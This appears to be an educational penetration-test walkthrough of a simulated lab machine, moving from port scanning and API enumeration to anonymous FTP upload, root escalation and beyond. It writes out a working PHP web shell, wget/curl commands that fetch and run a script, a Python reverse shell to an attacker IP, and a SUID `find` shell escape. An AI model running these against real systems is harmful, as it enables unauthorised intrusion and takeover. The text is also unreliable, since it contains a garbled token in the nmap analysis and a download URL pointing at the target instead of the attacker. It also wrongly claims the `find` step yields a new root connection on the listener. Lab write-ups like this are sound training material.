---
title: 'Example Doc: API V1'
date: '2026-01-05'
category: docs
enrich: false
image: assets/doc-thumb.png
tags: api, web, enumeration, exploitation, privilege escalation, nmap, gobuster, ffuf,
  python, shell
description: A beginner-friendly walkthrough of a simulated web application penetration
  test, covering reconnaissance, enumeration of web services and APIs, and exploitation
  to gain initial access and escalate privileges.
last_enriched: '2026-01-07'
---

Welcome, aspiring cybersecurity professionals! This walkthrough will guide you through a simulated penetration test, breaking down each step with clear explanations and focusing on the "why" behind our actions. We'll start from the very beginning, discovering the target, understanding its services, and eventually finding a way to gain access.

## Reconnaissance

Our first step is to understand what we're up against. This usually involves identifying live hosts and open ports.

In this scenario, we'll assume we've already identified an IP address for our target machine.

## Enumeration

Now that we know the target's IP, we need to figure out what services are running on it. This is like knocking on doors and seeing who answers.

### Port Scanning

We'll start by scanning the common ports to see what's open. A popular tool for this is Nmap.

```bash
nmap -sC -sV -p- 10.10.10.10
```

**🧠 Beginner Analysis**

*   **`nmap`**: This is our Network Mapper, a powerful tool for discovering hosts and services on a network.
*   **`-sC`**: This flag tells Nmap to run the default set of scripts. These scripts can help us gather more information about the services running on the open ports, like checking for known vulnerabilities or retrieving banners.
*   **`-sV`**: This flag instructs Nmap to perform version detection. It tries to figure out the exact software and version number running on each open port. This is crucial because specific software versions often have known security flaws.
*   **`-p-`**: This tells Nmap to scan all 65535 possible TCP ports. While this can be thorough, it's also time-consuming. In a real-world scenario, you might start with a scan of the most common ports first.
*   **`10.10.10.10`**: This is the IP address of our target machine.

Let's imagine Nmap gives us the following output:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-27 10:00 UTC
Nmap scan report for 10.10.10.10
Host is up (0.050s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
```

**🧠 Beginner Analysis**

*   **`PORT STATE SERVICE VERSION`**: This is the header for the information Nmap provides about each port.
*   **`21/tcp open ftp vsftpd 3.0.3`**: We see that port 21 is open, which is the standard port for the File Transfer Protocol (FTP). The `vsftpd 3.0.3` tells us the specific FTP server software and its version. FTP is often used for transferring files, and sometimes it can be misconfigured, allowing anonymous logins.
*   **`22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4грамм0.3 (...)`**: Port 22 is for Secure Shell (SSH), used for secure remote logins. The version `OpenSSH 7.6p1` is listed. SSH is generally secure, but sometimes weak passwords or configuration issues can be exploited.
*   **`80/tcp open http Apache httpd 2.4.29 ((Ubuntu))`**: Port 80 is the standard port for HTTP, meaning there's a web server running. The `Apache httpd 2.4.29` tells us it's an Apache web server. Web servers are a very common attack vector as they often host web applications that can have vulnerabilities.
*   **`443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu))`**: Port 443 is for HTTPS, the secure version of HTTP. It's also running Apache. We'll likely want to investigate both port 80 and 443.

### Web Server Enumeration

Since we found a web server on port 80, let's explore it. We'll use a tool called `gobuster` (or `ffuf`, which is very similar) to try and discover hidden directories and files on the web server.

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,bak
```

**🧠 Beginner Analysis**

*   **`gobuster dir`**: This command initiates a directory and file brute-forcing scan with Gobuster.
*   **`-u http://10.10.10.10`**: This specifies the target URL. We're targeting the web server running on port 80 of our target machine.
*   **`-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`**: This flag points to a wordlist. Wordlists are files containing common directory and file names. Gobuster will try appending each word from this list to our URL to see if they exist. `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` is a common location for such wordlists on Linux systems.
*   **`-x php,txt,html,js,bak`**: This option tells Gobuster to only look for files with these specific extensions. We're including common web file extensions (`.php`, `.html`, `.js`) and also looking for backup files (`.bak`) which might contain sensitive information.

Let's assume Gobuster finds something interesting:

```
/api              (Status: 200) [Size: 1500]
/admin            (Status: 301) [---> /admin/]
/blog             (Status: 301) [---> /blog/]
/api/users        (Status: 200) [Size: 120]
/backup.php.bak   (Status: 200) [Size: 500]
```

**🧠 Beginner Analysis**

*   **`/api (Status: 200)`**: We found a directory named `api` that returns a successful (200) status code. This is a strong indicator of an API endpoint. APIs (Application Programming Interfaces) are often how different software components communicate, and they can be a treasure trove of information or a pathway for exploitation if not secured properly.
*   **`/admin (Status: 301)`**: This shows a redirect to `/admin/`. This suggests an administrative interface, which is often a target for credential stuffing or brute-forcing attacks.
*   **`/blog (Status: 301)`**: Similarly, a redirect to `/blog/` suggests a blog section, which might have its own vulnerabilities, such as outdated content management systems.
*   **`/api/users (Status: 200)`**: This is particularly interesting! It seems to be an endpoint within the `/api` directory that lists users. This is a common API function.
*   **`/backup.php.bak (Status: 200)`**: We found a backup file for a PHP script. Backup files can sometimes contain plain text credentials or other sensitive configurations.

### API Enumeration (Deeper Dive)

We discovered an `/api` directory and a `/api/users` endpoint. Let's examine the API documentation we found earlier to understand how it works.

The documentation states:

```
# API V1 Documentation

> **Version**: 1.0.0
> **Status**: Stable

## Endpoints
### GET /users
Returns a list of users.

**Response**:
```json
[
  { "id": 1, "name": "Alice" }
]
```
```

**🧠 Beginner Analysis**

*   **API Version**: The API is documented as version `1.0.0` and is marked as `Stable`. This tells us we're dealing with a known, relatively mature version.
*   **Endpoint: `GET /users`**: This is the crucial part. The documentation explicitly states that a `GET` request to the `/users` endpoint will return a list of users.
*   **Response Format**: The example response shows a JSON array, where each object represents a user with an `id` and `name`.

We can interact with this endpoint directly using `curl` or by visiting it in our browser. Let's use `curl` for a programmatic approach.

```bash
curl http://10.10.10.10/api/users
```

**🧠 Beginner Analysis**

*   **`curl`**: This is a command-line tool for transferring data with URLs. It's very versatile for interacting with web servers and APIs.
*   **`http://10.10.10.10/api/users`**: This is the URL we're sending a `GET` request to. We're requesting the `/users` endpoint from our target API.

If successful, this command will return the same JSON output as shown in the documentation:

```json
[
  { "id": 1, "name": "Alice" }
]
```

This confirms our API is functioning as documented and provides us with usernames. In a real scenario, we might find more users, which could be useful for brute-forcing login forms on the `/admin` panel, for example.

## Exploitation

Now that we've enumerated services and understood some of the target's functionalities, it's time to look for ways to exploit any weaknesses we've found.

### Anonymous FTP Access

Remember the FTP server on port 21 (`vsftpd 3.0.3`)? One common misconfiguration is allowing anonymous logins. Let's try to log in using the username `anonymous` and any password.

```bash
ftp 10.10.10.10
```

Upon connecting, we'd be prompted for a username and password. Entering `anonymous` and a blank password often works.

```
Connected to 10.10.10.10.
220 (vsFTPd 3.0.3)
Name (10.10.10.10:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
ftp>
```

**🧠 Beginner Analysis**

*   **`ftp 10.10.10.10`**: This command initiates an FTP connection to our target IP address.
*   **`Name (...): anonymous`**: We entered `anonymous` as the username.
*   **`Password: `**: We pressed Enter without typing a password.
*   **`230 Login successful.`**: Success! The FTP server allowed us to log in without any credentials. This is a critical security misconfiguration.

Once logged in, we can list directories and upload files. Let's check the available directories:

```ftp
ls
```

Imagine we see a directory like `uploads`.

```ftp
cd uploads
ls
```

Now, let's try to upload a simple web shell. A web shell is a script that we can upload to the web server, and then access via our browser to execute commands on the server.

We'll create a basic PHP web shell named `shell.php`:

```php
<?php
    echo "<h1>System Command Executer</h1>";
    if(isset($_GET['cmd'])){
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
    }
?>
```

Then, we upload it using FTP:

```ftp
put shell.php
```

**🧠 Beginner Analysis**

*   **`ls`**: Lists the files and directories on the FTP server.
*   **`cd uploads`**: Changes the current directory to `uploads`.
*   **`put shell.php`**: This command uploads the local file `shell.php` to the current directory on the FTP server.
*   **Web Shell Concept**: The PHP code we wrote is a "web shell". When we upload this to the web server (running on port 80) and access it via our browser, we can pass commands to the `system()` function. For instance, if we visit `http://10.10.10.10/uploads/shell.php?cmd=whoami`, the server will execute `whoami` and display the output. This is a direct way to execute commands on the server.

Now, we can access our uploaded shell through the web server:

```
http://10.10.10.10/uploads/shell.php?cmd=whoami
```

This should return the username of the user running the web server (e.g., `www-data`). We can now execute any command within the context of this user!

### Gaining a Shell

We can use our web shell to download a more robust reverse shell. A reverse shell is a connection initiated *from* the target machine *back* to our attacker machine, giving us a more interactive command-line interface.

First, we need to set up a listener on our attacker machine to receive the incoming connection. We'll use `netcat` for this.

```bash
nc -lvnp 4444
```

**🧠 Beginner Analysis**

*   **`nc`**: `netcat`, often called the "Swiss army knife" of networking. It can read and write data across network connections using TCP or UDP.
*   **`-l`**: Listen mode.
*   **`-v`**: Verbose output, which means `nc` will tell us when it's listening and when a connection comes in.
*   **`-n`**: Do not do DNS lookups. This can speed things up.
*   **`-p 4444`**: Listen on port `4444`. We can choose any available port.

Now, using our web shell, we'll instruct the target to download and execute a Python reverse shell script. For demonstration, let's assume our attacker IP is `10.10.14.2`.

In the web shell URL, we'd put something like:

```
http://10.10.10.10/uploads/shell.php?cmd=wget http://10.10.10.10/shell.py -O /tmp/shell.py; python /tmp/shell.py
```

Or if `wget` isn't available, we might use `curl`:

```
http://10.10.10.10/uploads/shell.php?cmd=curl http://10.10.10.10/shell.py -o /tmp/shell.py; python /tmp/shell.py
```

The `shell.py` script would look something like this:

```python
import socket
import subprocess
import os

HOST = '10.10.14.2'  # Our attacker IP
PORT = 4444          # The port we're listening on

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/bash", "-i"])
```

**🧠 Beginner Analysis**

*   **`wget http://10.10.10.10/shell.py -O /tmp/shell.py`**: This command uses `wget` to download our Python reverse shell script from our attacker machine (assuming we hosted it there) to the temporary directory `/tmp` on the target machine. The `-O` flag specifies the output filename.
*   **`python /tmp/shell.py`**: This executes the downloaded Python script.
*   **`shell.py` explanation**:
    *   `import socket, subprocess, os`: Imports necessary Python modules for networking and process management.
    *   `HOST` and `PORT`: Define our attacker's IP address and the listening port.
    *   `s = socket.socket(...)`: Creates a new TCP socket object.
    *   `s.connect((HOST, PORT))`: Connects the socket to our listener on the attacker machine.
    *   `os.dup2(...)`: This is the magic! It redirects the standard input (0), standard output (1), and standard error (2) of the current process to the network socket. This means anything we type in our `netcat` listener will be sent to the target, and anything the target prints will be sent back to our listener.
    *   `subprocess.call(["/bin/bash", "-i"])`: Starts an interactive bash shell (`-i`) and pipes its input/output through the redirected socket.

Once the Python script executes on the target, our `netcat` listener should show a connection:

```
Listening on [0.0.0.0] (family 0, port 4444)
Connection received from 10.10.10.10 48870
/bin/bash: cannot set terminal process group: Inappropriate ioctl for device
/bin/bash: no job control in this shell
www-data@ubuntu:/var/www/html$
```

**🧠 Beginner Analysis**

*   **`Connection received from 10.10.10.10 48870`**: Our `netcat` listener successfully received a connection from the target machine.
*   **`www-data@ubuntu:/var/www/html$`**: We are now at a command prompt, and the prompt tells us we are the `www-data` user and are currently in the web server's root directory. We have a fully interactive shell!

## Privilege Escalation

We currently have a shell as the `www-data` user, which is a low-privileged user. Our goal is to become a more powerful user, typically `root`.

### Linux Capabilities

Sometimes, Linux executables have "capabilities" set that allow them to perform actions usually reserved for the root user, even when run by a less privileged user. We can check for these using `getcap`.

```bash
getcap -r / 2>/dev/null
```

**🧠 Beginner Analysis**

*   **`getcap -r /`**: This command recursively searches the entire file system (`/`) for files that have Linux capabilities set.
*   **`2>/dev/null`**: This redirects any error messages (like "Permission denied") to `/dev/null`, so we only see the actual capability information.

Let's say `getcap` outputs something like this:

```
/usr/bin/python3 = cap_net_raw,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
```

**🧠 Beginner Analysis**

*   **`/usr/bin/python3 = cap_net_raw,cap_net_admin+ep`**: This is very interesting. The `python3` executable has capabilities that allow it to perform raw network operations (`cap_net_raw`) and manage network interfaces (`cap_net_admin`). This is unusual for a standard Python interpreter.

### Exploiting Python Capabilities

Normally, a user cannot run arbitrary code with elevated privileges. However, if an executable has specific capabilities, it might allow for privilege escalation. In this case, the `cap_net_raw` and `cap_net_admin` capabilities, while related to networking, can sometimes be leveraged.

A more direct way to exploit capabilities is when an executable can be manipulated to run other programs. If we find an executable with `cap_sys_ptrace` or `cap_dac_override` for example, we could potentially use that.

However, let's consider a more common scenario based on *finding* specific vulnerabilities that `getcap` might not reveal directly, but we might find through other enumeration techniques (like SUID binaries or misconfigured services).

### Finding SUID Binaries

SUID (Set User ID) bits on executables allow a user to run a program with the permissions of the file's owner, rather than their own. If a binary owned by `root` has the SUID bit set, and it's vulnerable, we can exploit it to gain root privileges.

We can search for these with `find`:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**🧠 Beginner Analysis**

*   **`find /`**: Search starting from the root directory.
*   **`-perm -u=s`**: This is the key. It looks for files where the SUID bit (`u=s`) is set. The `-` means "at least these permissions are set".
*   **`-type f`**: Ensures we are only looking for files, not directories.
*   **`2>/dev/null`**: Suppresses permission denied errors.

Suppose this command reveals:

```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/find
```

**🧠 Beginner Analysis**

*   **`/usr/bin/sudo`**: This is expected. Sudo is designed to allow authorized users to run commands as root. If we can find a way to abuse `sudo`, that's a direct path to root.
*   **`/usr/bin/find`**: This is interesting! The `find` command, when run with the SUID bit set, can be powerful. If `find` can be tricked into executing arbitrary commands, we could gain root.

### Exploiting `find` SUID

GTFOBins is an excellent resource for finding SUID exploits. We can check if `find` can be used to execute commands.

According to GTFOBins, `find` can be exploited by using the `-exec` option creatively.

```bash
find . -exec /bin/bash \; -quit
```

Let's try this from our current shell:

```bash
find /tmp/ -exec /bin/bash \; -quit
```

**🧠 Beginner Analysis**

*   **`find /tmp/`**: We're telling `find` to start searching in the `/tmp` directory.
*   **`-exec /bin/bash \;`**: This is the crucial part. The `-exec` option allows `find` to run a command. Here, we're telling `find` to execute `/bin/bash`. Because `find` is running with root privileges (due to the SUID bit), the `/bin/bash` it executes will also have root privileges.
*   **`-quit`**: This tells `find` to exit immediately after the first execution, making it faster and cleaner.

If this command is successful, our `netcat` listener will receive a *new* connection, this time with root privileges!

```
Listening on [0.0.0.0] (family 0, port 4444)
Connection received from 10.10.10.10 49122
root@ubuntu:/tmp#
```

**🧠 Beginner Analysis**

*   **`root@ubuntu:/tmp#`**: We have successfully escalated our privileges to `root`! We are now the administrator of the system and can perform any action.

This concludes our walkthrough. We've journeyed from initial reconnaissance to gaining root access, learning about network scanning, web enumeration, API interaction, FTP misconfigurations, web shells, reverse shells, and SUID exploitation. Keep practicing these steps, and you'll become proficient in penetration testing!
